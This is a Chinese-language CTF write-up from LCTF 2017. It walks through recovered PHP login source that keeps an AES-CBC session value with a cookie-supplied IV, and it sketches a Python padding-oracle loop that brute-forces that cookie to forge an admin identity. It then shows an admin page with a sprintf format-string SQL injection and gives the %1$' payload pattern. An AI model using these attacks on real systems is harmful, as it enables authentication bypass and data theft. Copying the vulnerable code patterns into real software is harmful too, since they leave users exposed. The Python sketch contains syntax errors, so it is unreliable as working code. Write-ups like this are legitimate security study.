title: LCTF Padding Oracle Attack
date: 2017-11-28 08:32:44
tags: ['PHP安全相关']

# 源码

扫到.login.php.swp，还原之后为：

```

<?php

error_reporting(0);
session_start();
define("METHOD", "aes-128-cbc");
include('config.php');
function show_page(){
    echo '<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Login Form</title>
  <link rel="stylesheet" type="text/css" href="css/login.css" />
</head>
<body>
  <div class="login">
</h1>
    <h1>
    <form method="post">
        <input type="text" name="username" placeholder="Username" required="required" />
        <input type="password" name="password" placeholder="Password" required="required" />
        <button type="submit" class="btn btn-primary btn-block btn-large">Login</button>
    </form>
</div>
</body>
</html>';
function get_random_token(){
    $random_token = '';
    $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
    for($i = 0; $i < 16; $i++){
        $random_token .= substr($str, rand(1, 61), 1);
    }
    return $random_token;
function get_identity(){
	global $id;
    $token = get_random_token();
    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("token", base64_encode($token));
    if($id === 'admin'){
    	$_SESSION['isadmin'] = 1;
    }else{
    	$_SESSION['isadmin'] = 0;
    }
function test_identity(){
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        $token = base64_decode($_COOKIE["token"]);
        if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){
            if ($u === 'admin') {
                $_SESSION['isadmin'] = 1;
                return 1;
            }
        }else{
            die("Error!");
        } 
    }
    return 0;}
if(isset($_POST['username'])&&isset($_POST['password'])){
	$username = mysql_real_escape_string($_POST['username']);
	$password = $_POST['password'];
	$result = mysql_query("select password from users where username='" . $username . "'", $con);
	$row = mysql_fetch_array($result);
	if($row['password'] === md5($password)){
  		get_identity();
  		header('location: ./admin.php');
  	}else{
  		die('Login failed.');
  	}
}else{
	if(test_identity()){
        header('location: ./admin.php');
	}else{
        show_page();
    }
}
?>
```

仔细看过之后，发现只能从加密算法这边怼，就想到了Padding Oracle Attack，在这里我的目的就是将$_SESSION['admin']改为admin

我们发现这里的cookie是可控的，并且会带入aes中，所以我们可以从aes下手

这一块的东西主要是一个CBC翻转攻击，具体的看这篇文章  (这里)["http://zjw.dropsec.xyz/CTF/2017/04/24/CBC字节翻转攻击.html"]

首先获取我们的session，然后post拿set-cookie，然后拿两者计算中间量.

大概的脚本思路为:
```python
n=16
phpsession
cookie
middle
for i in range(1,n+1):
    for j in range(0,256):
        pad  = middle ^ (chr(i)*(i-1))
        c = chr(0)*(16-1)+chr(j)+pad
        result = requests.post(url=url,headers={"Cookie":"PHPSESSID:"+phpsession";token:"+base64.b64encode(token)})
        if "Error" in result.content:
            middle = chr(j^i)+middle

```

然后拿到替换token就可以登录了。

接下来是一个格式化串SQL注入，源码如下：

```php
<?php
error_reporting(0);
session_start();
include('config.php');
if(!$_SESSION['isadmin']){
	die('You are not admin');
}
if(isset($_GET['id'])){
	$id = mysql_real_escape_string($_GET['id']);
	if(isset($_GET['title'])){
		$title = mysql_real_escape_string($_GET['title']);
		$title = sprintf("AND title='%s'", $title);
	}else{
		$title = '';
	}
	$sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
	$result = mysql_query($sql,$con);
	$row = mysql_fetch_array($result);
	if(isset($row['title'])&&isset($row['content'])){
		echo "<h1>".$row['title']."</h1><br>".$row['content'];
		die();
	}else{
		die("This article does not exist.");
	}
}
?>
```

很简单的格式化字符串漏洞，title=%1$'  xxxx  这种模式字符串即可。

